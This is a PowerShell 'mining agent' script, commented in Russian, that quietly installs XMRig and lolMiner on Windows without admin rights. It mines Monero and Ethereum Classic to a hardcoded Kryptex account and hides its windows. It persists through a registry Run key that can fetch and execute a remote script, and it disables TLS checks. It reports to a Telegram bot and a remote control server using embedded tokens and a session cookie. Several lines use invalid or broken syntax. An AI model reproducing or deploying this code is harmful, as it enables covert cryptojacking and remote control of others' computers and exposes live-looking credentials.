<#
MINING AGENT — WINDOWS (NO-ADMIN, VERBOSE-TG)
Каждый шаг → уведомление в Telegram для отладки
#>
param([switch]$InstallOnly, [switch]$NoWatchdog, [switch]$Uninstall)

# ===== КОНСТАНТЫ =====
$TG_TOKEN = "5466273638:AAF5XEp-3IIgjsgOlV2YauFeSnBlAZeFe5M"
$TG_CHAT = "5336452267"
$KRIPTEX = "krxX3PVQVR"
$XMR_POOL = "xmr.kryptex.network:7029"
$ETC_POOL = "etc.kryptex.network:7033"
$API_BASE = "${env:API_BASE:-https://lolipop2018.online}"
$AUTH_SESSION = "${env:AUTH_SESSION:-_CKU0PGWv9EwWBJmdNJyZDF5AdkJ4KJa2Gv2GV9fVe0}"
$API_TIMEOUT = 15
$API_SKIP_SSL = "${env:API_SKIP_SSL:-1}"
$INTERVAL = 30

# ===== ИДЕНТИФИКАЦИЯ ХОСТА =====
$HOST = $env:COMPUTERNAME -replace '[^a-zA-Z0-9_-]', '_'
$RUN_ID = "${env:MINING_RUN_ID:-run_$(Get-Date -UFormat %s)_$HOST}"
$FIRST_RUN = "$env:TEMP\.mining_first_$HOST"

# ===== IP =====
function Get-MyIP {
    try { $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127\.|^169\.254\.|^0\.0\.0\.0$' } | Select-Object -First 1).IPAddress; if($ip){return $ip} } catch {}
    try { $ping = Test-Connection -ComputerName "1.1.1.1" -Count 1 -ErrorAction SilentlyContinue; if($ping){return $ping.IPv4Address} } catch {}
    return "0.0.0.0"
}
$AGENT_IP = Get-MyIP

# ===== TELEGRAM — КАЖДЫЙ ШАГ =====
function TG {
    param([string]$Msg, [string]$Emoji = "🔄", [bool]$Force = $false)
    try {
        $text = "$Emoji <b>$HOST</b>`n$Msg"
        $body = @{chat_id = $TG_CHAT; text = $text; parse_mode = "HTML"; disable_web_page_preview = $true} | ConvertTo-Json -Compress
        if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
            $ssl = if ($API_SKIP_SSL -eq "1") { "-k" } else { "" }
            curl.exe -s $ssl -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -H "Content-Type: application/json" -d $body --connect-timeout 5 --max-time 10 | Out-Null
        } else {
            if ($API_SKIP_SSL -eq "1") { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } }
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -Method Post -ContentType "application/json" -Body $body -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
        }
    } catch {
        # Если ТГ упал — пишем в лог, но не ломаем скрипт
        Add-Content -Path "$env:TEMP\mining_tg_fallback.log" -Value "[$(Get-Date -Format 'HH:mm:ss')] TG FAIL: $Msg" -ErrorAction SilentlyContinue
    }
}

# ===== API HELPERS (по спецификации) =====
function API-Post {
    param($Endpoint, $Json)
    try {
        $uri = "$API_BASE$Endpoint"
        if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
            $ssl = if ($API_SKIP_SSL -eq "1") { "-k" } else { "" }
            curl.exe -s $ssl -X POST $uri -H "Content-Type: application/json" -H "Cookie: auth_session=$AUTH_SESSION" -d $Json --connect-timeout 10 --max-time $API_TIMEOUT | Out-Null
        } else {
            if ($API_SKIP_SSL -eq "1") { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } }
            Invoke-RestMethod -Uri $uri -Method Post -Headers @{ "Content-Type" = "application/json"; "Cookie" = "auth_session=$AUTH_SESSION" } -Body $Json -TimeoutSec $API_TIMEOUT -ErrorAction SilentlyContinue | Out-Null
        }
    } catch {}
}
function API-HB {
    param($Event, $Message = "")
    $json = "{\"username\":\"$HOST\",\"ip\":\"$AGENT_IP\",\"event\":\"$Event\"$(if($Message){',\"message\":\"' + $Message + '\"'})$(if($RUN_ID){',\"run_id\":\"' + $RUN_ID + '\"'})}"
    API-Post "/api/heartbeat" $json
}
function API-Log {
    param($Message)
    $json = "{\"username\":\"$HOST\",\"ip\":\"$AGENT_IP\",\"message\":\"$Message\"$(if($RUN_ID){',\"run_id\":\"' + $RUN_ID + '\"'})}"
    API-Post "/api/logs/push" $json
}

# ===== PATHS =====
$BASE = "${env:MINING_BASE:-$env:USERPROFILE\.mining}"
$BIN = "$BASE\bin"; $RUN = "$BASE\run"; $LOG = "$BASE\log"

# ===== RUNAS INVOKER WRAPPER =====
$WRAP = "$BASE\runas.bat"
if (-not (Test-Path $WRAP)) {
    TG "Создаю runas.bat wrapper" "📦"
    @"
@echo off
setlocal
set "__COMPAT_LAYER=runasinvoker"
set "TARGET=%~1"
shift
set "ARGS=%*"
start /min /b "" cmd /c "%TARGET%" %ARGS%
exit /b 0
"@ | Out-File -FilePath $WRAP -Encoding ascii -Force
    TG "runas.bat создан" "✅"
}

# ===== ИНИЦИАЛИЗАЦИЯ =====
TG "🔹 Агент запущен`n🆔 RunID: <code>$RUN_ID</code>`n🌐 IP: <code>$AGENT_IP</code>`n📁 BASE: <code>$BASE</code>" "🚀"
API-HB "agent_init" "Mining agent starting on $HOST"

# Маркер первого запуска
$IsFirstRun = -not (Test-Path $FIRST_RUN)
if ($IsFirstRun) {
    TG "🟢 ПЕРВЫЙ ЗАПУСК на этом хосте" "🎉"
    "" | Out-File -FilePath $FIRST_RUN -Encoding ascii -Force
}

# ===== СОЗДАНИЕ ПАПОК =====
TG "Создаю структуру папок..." "📁"
try {
    New-Item -Path "$BIN\cpu","$BIN\gpu","$RUN","$LOG" -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    TG "✅ Папки созданы`n<code>$BIN\cpu</code>`n<code>$BIN\gpu</code>`n<code>$RUN</code>`n<code>$LOG</code>" "📂"
} catch {
    TG "❌ Ошибка создания папок: $_" "💥"
    API-Log "FATAL: Cannot create directories: $_"
    exit 1
}

# ===== УСТАНОВКА XMRIG =====
function Install-XMRig {
    TG "📦 Начинаю установку XMRig..." "⬇️"
    API-Log "Installing XMRig"
    Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
    $target = "$BIN\cpu\xmrig.exe"
    if (Test-Path $target) { Remove-Item $target -Force; TG "🗑️ Удалён старый xmrig.exe" "🧹" }
    
    $urls = @(
        "https://xmrig.com/download/xmrig-6.25.0-msvc-win64.zip",
        "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-msvc-win64.zip"
    )
    
    foreach ($url in $urls) {
        TG "🌐 Пробую скачать с: <code>$url</code>" "🔗"
        $tmp = "$env:TEMP\xmrig.zip"
        try {
            if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
                $ssl = if ($API_SKIP_SSL -eq "1") { "-k" } else { "" }
                $dl = curl.exe -s -L $ssl $url -o $tmp -w "%{http_code}|%{size_download}" --connect-timeout 10 --max-time 60
                $code = $dl.Split('|')[0]; $size = $dl.Split('|')[1]
            } else {
                Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -TimeoutSec 60
                $code = "200"; $size = (Get-Item $tmp -ErrorAction SilentlyContinue).Length
            }
            
            if ($code -eq "200" -and $size -gt 100000) {
                TG "✅ Скачано: $size байт, код $code" "📥"
                TG "📦 Распаковываю архив..." "🗜️"
                Expand-Archive -Path $tmp -DestinationPath "$BIN\cpu" -Force
                $src = Get-ChildItem "$BIN\cpu" -Directory | Where-Object { $_.Name -like "xmrig-*" } | Select-Object -First 1
                if ($src) {
                    Move-Item "$($src.FullName)\xmrig.exe" $target -Force
                    Remove-Item $src.FullName -Recurse -Force -ErrorAction SilentlyContinue
                }
                Remove-Item $tmp -Force
                if (Test-Path $target) {
                    TG "✅ XMRig успешно установлен`n📍 <code>$target</code>" "✅"
                    API-Log "XMRig installed"
                    return $true
                }
            } else {
                TG "⚠️ Скачан битый файл: код=$code, размер=$size" "⚠️"
            }
        } catch {
            TG "❌ Ошибка загрузки/распаковки: $_" "💥"
        }
    }
    TG "❌ XMRig: не удалось установить ни с одного зеркала" "🚫"
    API-Log "ERROR: XMRig install failed"
    return $false
}

# ===== УСТАНОВКА LOLMINER =====
function Install-LolMiner {
    TG "📦 Начинаю установку lolMiner..." "⬇️"
    API-Log "Installing lolMiner"
    Stop-Process -Name "lolMiner" -Force -ErrorAction SilentlyContinue
    $target = "$BIN\gpu\lolMiner.exe"
    if (Test-Path $target) { Remove-Item $target -Force; TG "🗑️ Удалён старый lolMiner.exe" "🧹" }
    
    $url = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Win64.zip"
    TG "🌐 Скачиваю: <code>$url</code>" "🔗"
    $tmp = "$env:TEMP\lolminer.zip"
    try {
        if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
            $ssl = if ($API_SKIP_SSL -eq "1") { "-k" } else { "" }
            $dl = curl.exe -s -L $ssl $url -o $tmp -w "%{http_code}|%{size_download}" --connect-timeout 10 --max-time 60
            $code = $dl.Split('|')[0]; $size = $dl.Split('|')[1]
        } else {
            Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -TimeoutSec 60
            $code = "200"; $size = (Get-Item $tmp -ErrorAction SilentlyContinue).Length
        }
        
        if ($code -eq "200" -and $size -gt 100000) {
            TG "✅ Скачано: $size байт" "📥"
            TG "📦 Распаковываю..." "🗜️"
            Expand-Archive -Path $tmp -DestinationPath "$BIN\gpu" -Force
            $src = Get-ChildItem "$BIN\gpu" -Directory | Where-Object { $_.Name -like "lolMiner_v*" } | Select-Object -First 1
            if ($src) {
                Move-Item "$($src.FullName)\lolMiner.exe" $target -Force
                Remove-Item $src.FullName -Recurse -Force -ErrorAction SilentlyContinue
            }
            Remove-Item $tmp -Force
            if (Test-Path $target) {
                TG "✅ lolMiner успешно установлен`n📍 <code>$target</code>" "✅"
                API-Log "lolMiner installed"
                return $true
            }
        } else {
            TG "⚠️ Битый файл: код=$code, размер=$size" "⚠️"
        }
    } catch {
        TG "❌ Ошибка: $_" "💥"
    }
    TG "❌ lolMiner: установка не удалась" "🚫"
    API-Log "ERROR: lolMiner install failed"
    return $false
}

# ===== ЗАПУСК МАЙНЕРОВ =====
function Start-CPUMiner {
    TG "🖥 Запускаю XMRig (CPU)..." "▶️"
    Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
    $args = "-o $XMR_POOL -u $KRIPTEX.$HOST -p x --http-enabled --http-host 127.0.0.1 --http-port 16000"
    TG "📋 Аргументы: <code>$args</code>" "📝"
    
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$WRAP`" `"$BIN\cpu\xmrig.exe`" $args" `
        -NoNewWindow -RedirectStandardOutput "$LOG\cpu.log" -RedirectStandardError "$LOG\cpu.log"
    Start-Sleep -Seconds 3
    
    $proc = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc) {
        $proc.Id | Out-File "$RUN\cpu.pid" -Encoding ascii
        TG "✅ XMRig запущен (PID: $($proc.Id))`n📄 Лог: <code>$LOG\cpu.log</code>" "✅"
        API-HB "cpu_started" "XMRig launched on $HOST"
        return $true
    } else {
        TG "❌ XMRig не запустился (процесс не найден)" "💥"
        $err = Get-Content "$LOG\cpu.log" -Tail 10 -ErrorAction SilentlyContinue | Out-String
        if ($err) { TG "📋 Последние строки лога:`n<code>$err</code>" "📜" }
        API-Log "ERROR: XMRig failed to start"
        return $false
    }
}

function Start-GPUMiner {
    TG "🎮 Запускаю lolMiner (GPU)..." "▶️"
    Stop-Process -Name "lolMiner" -Force -ErrorAction SilentlyContinue
    $args = "--algo ETCHASH --pool $ETC_POOL --user $KRIPTEX.$HOST --ethstratum ETCPROXY --apihost 127.0.0.1 --apiport 8080"
    TG "📋 Аргументы: <code>$args</code>" "📝"
    
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$WRAP`" `"$BIN\gpu\lolMiner.exe`" $args" `
        -NoNewWindow -RedirectStandardOutput "$LOG\gpu.log" -RedirectStandardError "$LOG\gpu.log"
    Start-Sleep -Seconds 3
    
    $proc = Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc) {
        $proc.Id | Out-File "$RUN\gpu.pid" -Encoding ascii
        TG "✅ lolMiner запущен (PID: $($proc.Id))`n📄 Лог: <code>$LOG\gpu.log</code>" "✅"
        API-HB "gpu_started" "lolMiner launched on $HOST"
        return $true
    } else {
        TG "❌ lolMiner не запустился" "💥"
        $err = Get-Content "$LOG\gpu.log" -Tail 10 -ErrorAction SilentlyContinue | Out-String
        if ($err) { TG "📋 Лог:`n<code>$err</code>" "📜" }
        API-Log "ERROR: lolMiner failed to start"
        return $false
    }
}

# ===== ЧТЕНИЕ ХЕШРЕЙТА =====
function Get-CPUHR {
    try {
        $resp = if (Get-Command curl.exe -ea 0) {
            curl.exe -s "http://127.0.0.1:16000/1/summary" --connect-timeout 3 --max-time 3
        } else {
            Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/summary" -TimeoutSec 3 -ea 0
        }
        if ($resp -is [string]) { $resp = $resp | ConvertFrom-Json -ea 0 }
        return [math]::Round($resp.hashrate.total, 2)
    } catch { return 0 }
}
function Get-GPUHR {
    try {
        $resp = if (Get-Command curl.exe -ea 0) {
            curl.exe -s "http://127.0.0.1:8080/summary" --connect-timeout 3 --max-time 3
        } else {
            Invoke-RestMethod -Uri "http://127.0.0.1:8080/summary" -TimeoutSec 3 -ea 0
        }
        if ($resp -is [string]) { $resp = $resp | ConvertFrom-Json -ea 0 }
        return $resp.Performance
    } catch { return 0 }
}

# ===== АВТОЗАПУСК (HKCU\Run) =====
function Ensure-Autostart {
    TG "⚙️ Настраиваю автозапуск..." "🔧"
    $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $name = "MiningAgent_$HOST"
    $scriptUrl = $env:MINING_SCRIPT_URL
    if ($scriptUrl) {
        $cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"irm '$scriptUrl' | iex`""
    } else {
        $local = $MyInvocation.MyCommand.Path
        if ($local) { $cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$local`"" }
    }
    if ($cmd) {
        New-ItemProperty -Path $reg -Name $name -Value $cmd -PropertyType String -Force -ea 0 | Out-Null
        TG "✅ Автозапуск добавлен в реестр`n<code>HKCU\...\Run\$name</code>" "✅"
        API-Log "Autostart configured via HKCU\Run"
    } else {
        TG "⚠️ Не удалось определить путь для автозапуска" "⚠️"
    }
}

# ===== УДАЛЕНИЕ =====
function Do-Uninstall {
    TG "🗑️ Начинаю удаление..." "🧹"
    API-HB "agent_stop" "Uninstalling on $HOST"
    Stop-Process -Name "xmrig","lolMiner" -Force -ea 0
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MiningAgent_$HOST" -ea 0
    Remove-Item $BASE -Recurse -Force -ea 0
    Remove-Item $FIRST_RUN -Force -ea 0
    TG "✅ Удаление завершено" "✅"
    API-Log "Uninstall complete"
    exit 0
}

# ===== MAIN =====
if ($Uninstall) { Do-Uninstall }

TG "🔍 Проверка ALLOW_MINING..." "🔐"
if ($env:ALLOW_MINING -ne "1") {
    TG "⚠️ ALLOW_MINING != 1, завершаю работу" "🛑"
    exit 0
}
TG "✅ ALLOW_MINING=1, продолжаю" "✅"

# Установка
$CPU_OK = Install-XMRig
$GPU_OK = Install-LolMiner

# Автозапуск
Ensure-Autostart

# Запуск майнеров
TG "🚀 Запускаю майнеры..." "▶️▶️"
$CPU_RUN = $false; $GPU_RUN = $false
if ($CPU_OK) { $CPU_RUN = Start-CPUMiner } else { TG "⏭️ Пропускаю запуск CPU (установка не удалась)" "⏭️" }
if ($GPU_OK) { $GPU_RUN = Start-GPUMiner } else { TG "⏭️ Пропускаю запуск GPU (установка не удалась)" "⏭️" }

# Итог
if ($CPU_RUN -or $GPU_RUN) {
    TG "🎉 МИНИНГ ЗАПУЩЕН`n🖥 CPU: <b>$($CPU_RUN?'✅':'❌')</b>`n🎮 GPU: <b>$($GPU_RUN?'✅':'❌')</b>" "🏁"
    API-HB "mining_started" "CPU=$($CPU_RUN?1:0) GPU=$($GPU_RUN?1:0)"
} else {
    TG "❌ НЕ УДАЛОСЬ ЗАПУСТИТЬ НИ ОДИН МАЙНЕР" "🚫"
    API-HB "mining_failed" "No miners could be started"
    if (-not $InstallOnly) { exit 1 }
}

if ($InstallOnly -or $NoWatchdog) { TG "ℹ️ Выход (режим $($(if($InstallOnly){'InstallOnly'}elseif($NoWatchdog){'NoWatchdog'})))"; exit 0 }

# ===== WATCHDOG =====
TG "🔁 Запускаю watchdog (интервал: ${INTERVAL}с)" "👁️"
while ($true) {
    # CPU
    if ($CPU_OK) {
        $p = Get-Process -Name "xmrig" -ea 0 | Select-Object -First 1
        if (-not $p) {
            TG "⚠️ WATCHDOG: xmrig не найден, перезапускаю..." "🔄"
            Start-CPUMiner | Out-Null
            API-Log "WATCHDOG: CPU miner restarted"
        }
    }
    # GPU
    if ($GPU_OK) {
        $p = Get-Process -Name "lolMiner" -ea 0 | Select-Object -First 1
        if (-not $p) {
            TG "⚠️ WATCHDOG: lolMiner не найден, перезапускаю..." "🔄"
            Start-GPUMiner | Out-Null
            API-Log "WATCHDOG: GPU miner restarted"
        }
        # Хешрейт
        $hr = Get-GPUHR
        if ($hr -eq 0 -or $hr -lt 0.1) {
            TG "⚠️ WATCHDOG: GPU hashrate = $hr MH/s (низкий), перезапускаю..." "🔄"
            Start-GPUMiner | Out-Null
            API-Log "WATCHDOG: GPU zero/low hashrate"
        }
    }
    # Heartbeat
    $c = Get-CPUHR; $g = Get-GPUHR
    API-HB "watchdog_tick" "CPU=${c}H/s GPU=${g}MH/s"
    # Тихий тик в ТГ (каждые 5 итераций, чтобы не спамить)
    $tick++
    if ($tick % 5 -eq 0) {
        TG "👁️ Watchdog tick #$tick`n🖥 CPU: ${c}H/s | 🎮 GPU: ${g}MH/s" "💓"
    }
    Start-Sleep -Seconds $INTERVAL
}
